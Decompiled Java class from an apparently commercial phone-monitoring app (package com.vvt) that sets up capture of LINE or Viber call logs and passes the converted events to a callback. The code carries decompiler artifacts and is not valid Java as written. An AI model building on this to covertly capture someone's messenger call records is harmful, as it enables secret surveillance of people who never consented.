package com.vvt.capture.c.b.a;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.h.d;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private String c;
  private e d;
  private f e;
  private RunningMode f;
  private d g;
  
  public a(Context paramContext, String paramString1, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, String paramString2)
  {
    this.c = paramString1;
    this.b = parama;
    this.f = paramRunningMode;
    Object localObject1 = new com/vvt/h/a;
    ((com.vvt.h.a)localObject1).<init>();
    Object localObject2 = this.f;
    Object localObject3 = RunningMode.FULL;
    boolean bool;
    if (localObject2 == localObject3)
    {
      bool = false;
      localObject2 = null;
      localObject2 = ((com.vvt.h.a)localObject1).a(paramContext, bool);
      this.g = ((d)localObject2);
      localObject2 = this.f;
      localObject1 = RunningMode.FULL;
      if (localObject2 != localObject1) {
        break label145;
      }
      bool = a;
      if (bool) {}
      localObject2 = new com/vvt/capture/c/b/a/a/a/a;
      ((com.vvt.capture.c.b.a.a.a.a)localObject2).<init>();
      this.d = ((e)localObject2);
      localObject2 = new com/vvt/capture/c/b/a/a/a/b;
      localObject1 = this.g;
      ((com.vvt.capture.c.b.a.a.a.b)localObject2).<init>((d)localObject1);
      this.e = ((f)localObject2);
    }
    for (;;)
    {
      return;
      bool = true;
      break;
      label145:
      localObject2 = this.f;
      localObject1 = RunningMode.LIMITED_1;
      if (localObject2 == localObject1)
      {
        bool = a;
        if (bool) {}
        localObject2 = new com/vvt/capture/c/b/a/a/b/a;
        ((com.vvt.capture.c.b.a.a.b.a)localObject2).<init>(paramString1, paramb, paramContext, paramString2);
        this.d = ((e)localObject2);
        localObject2 = new com/vvt/capture/c/b/a/a/b/b;
        localObject1 = this.c;
        localObject3 = this.g;
        ((com.vvt.capture.c.b.a.a.b.b)localObject2).<init>((String)localObject1, (d)localObject3, paramString2);
        this.e = ((f)localObject2);
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool2 = localObject instanceof com.vvt.capture.c.a;
        if (bool2)
        {
          localObject = b.a((com.vvt.capture.c.a)localObject);
          localArrayList.add(localObject);
        }
      }
      Object localObject = this.b;
      if (localObject != null)
      {
        bool1 = k();
        if (bool1)
        {
          bool1 = a;
          if (bool1) {}
          localObject = this.b;
          ((com.vvt.base.a)localObject).a(localArrayList);
        }
      }
    }
  }
  
  protected e b()
  {
    return this.d;
  }
  
  protected f c()
  {
    return this.e;
  }
  
  protected String d()
  {
    return "LineCallLogCapture";
  }
  
  protected String e()
  {
    return this.c;
  }
  
  protected String f()
  {
    return "viber_calllog.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */